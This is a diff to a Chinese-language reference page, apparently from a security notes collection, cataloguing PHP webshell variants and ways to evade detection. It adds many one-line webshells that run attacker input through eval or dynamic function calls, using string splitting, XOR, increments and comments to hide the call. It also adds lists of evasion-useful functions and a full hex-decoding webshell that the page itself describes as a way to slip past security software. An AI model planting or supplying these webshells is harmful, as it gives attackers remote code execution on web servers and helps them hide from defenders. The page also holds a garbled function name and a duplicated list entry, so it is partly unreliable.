@@ -8,18 +8,29 @@ WebShell
 - ``$_FILE``
     - ``eval($_FILE['name']);``
 - 拆分
-    - ``assert(${"_PO"."ST"} ['sz']);``
+    - ``eval(${"_PO"."ST"} ['sz']);``
 - 动态函数执行
     - ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
+    - ``$a=$_GET['a'];$a($_GET['b']);``
 - create_function
     - ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
 - preg_replace
-- rot13
-- base64
+- 变形
+    - str_replace(" ", "e v a l")
 - 进制转化
     - ``"\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145"``
+- 进制运算
+    - ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
+- 自增运算
+    - ``$a="a";$a++;``
+- 强制类型转换
+    - ``$a='';$a.=[]; // Array``
 - 利用文件名
     - ``__FILE__``
+- 注释
+    - ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
+- 反射
+    - ``ReflectionFunction``
 
 Bypass
 --------------------------------
@@ -33,33 +44,61 @@ Bypass
 
 字符串变形函数
 --------------------------------
-- ucwords
-- ucfirst
-- trim
-- substr_replace
-- substr
-- strtr
-- strtoupper
-- strtolower
-- strtok
+- str_replace
 - str_rot13
+- strtok
+- strtolower
+- strtoupper
+- strtr
+- substr
+- substr_replace
+- trim
+- ucfirst
+- ucwords
 
 回调函数
 --------------------------------
-- call_user_func_array
-- call_user_func
-- array_filter 
-- array_walk  
+- array_filter
 - array_map
-- registregister_shutdown_function
-- register_tick_function
-- filter_var 
-- filter_var_array 
-- uasort 
-- uksort 
 - array_reduce
-- array_walk 
+- array_walk
+- array_walk
 - array_walk_recursive
+- call_user_func
+- call_user_func_array
+- filter_var
+- filter_var_array
+- register_tick_function
+- registregister_shutdown_function
+- uasort
+- uksort
+
+加解密函数
+--------------------------------
+- mcrypt_encrypt
+- openssl_encrypt
+
+其他执行方式
+--------------------------------
+- FFI
+- SimpleXML
+- SimpleXMLElement
+
+自定义函数
+--------------------------------
+使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。
+
+.. code:: php
+
+    $string = '';
+    $password = 'password';
+    if(isset($_POST[$password])){
+        $hex = $_POST[$password];
+        for($i = 0; $i < strlen($hex) - 1; $i += 2) {
+            $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+        }
+    }
+    eval($string);
 
 特殊字符Shell
 --------------------------------
